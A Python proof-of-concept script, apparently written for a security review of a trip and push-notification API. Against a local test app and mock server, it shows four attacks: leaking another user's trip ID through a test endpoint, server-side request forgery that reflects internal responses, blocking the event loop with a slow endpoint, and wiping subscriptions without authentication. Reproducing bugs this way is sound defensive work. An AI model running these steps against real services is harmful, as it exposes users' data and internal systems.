"""HTTP-level repro against a running uvicorn on :8766 (mock push server on :8765)."""
import base64, os, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import httpx
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_POST(self):
        self.rfile.read(int(self.headers.get("Content-Length") or 0))
        if self.path == "/hang":
            time.sleep(6)
        body = b"INTERNAL-ADMIN-PAGE-CONTENT" if self.path == "/internal" else b""
        self.send_response(404 if self.path == "/internal" else 201)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


srv = ThreadingHTTPServer(("127.0.0.1", 8765), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def keys():
    k = ec.generate_private_key(ec.SECP256R1())
    return {"p256dh": b64(k.public_key().public_bytes(serialization.Encoding.X962,
            serialization.PublicFormat.UncompressedPoint)), "auth": b64(os.urandom(16))}


import sys, os; sys.path.insert(0, os.getcwd())
from fastapi.testclient import TestClient
from app.main import app
API = "/api"
_cm = TestClient(app); c = _cm.__enter__()
# victim
victim = c.post(f"{API}/trips", json={"appointment_at": "2026-09-19T10:30:00+08:00"}).json()
print("victim trip", victim.get("trip_id"), list(victim)[:6])
c.post(f"{API}/push/subscribe", json={"subscription": {"endpoint": "http://127.0.0.1:8765/victimphone", "keys": keys()}, "trip_ids": [victim["trip_id"]]})

# 1. attacker, no trip_id: learns someone's trip id, then reads the trip
r = c.post(f"{API}/push/test").json()
leaked = r["payload"]["trip_id"]
print("push/test leaked trip_id:", leaked, "subs pushed:", r["subscriptions"], r["results"])
print("GET leaked trip keys:", list(c.get(f"{API}/trips/{leaked}").json())[:8])

# 2. SSRF with reflected body
atk = c.post(f"{API}/trips", json={"appointment_at": "2026-09-19T11:30:00+08:00"}).json()["trip_id"]
c.post(f"{API}/push/subscribe", json={"subscription": {"endpoint": "http://127.0.0.1:8765/internal", "keys": keys()}, "trip_ids": [atk]})
r = c.post(f"{API}/push/test", params={"trip_id": atk}).json()
print("SSRF result:", r["results"])

# 3. event loop blocked by a slow endpoint
c.post(f"{API}/push/subscribe", json={"subscription": {"endpoint": "http://127.0.0.1:8765/hang", "keys": keys()}, "trip_ids": [atk]})
t = threading.Thread(target=lambda: c.post(f"{API}/push/test", params={"trip_id": atk}))
t.start(); time.sleep(0.5)
t0 = time.time(); c.get(f"{API}/health"); print("health latency during push/test: %.1fs" % (time.time() - t0))
t.join()

# 4. anonymous wipe
print("DELETE no endpoint:", c.delete(f"{API}/push/subscribe").json())
print("victim trip after:", c.get(f"{API}/trips/{victim['trip_id']}").status_code)
srv.shutdown()
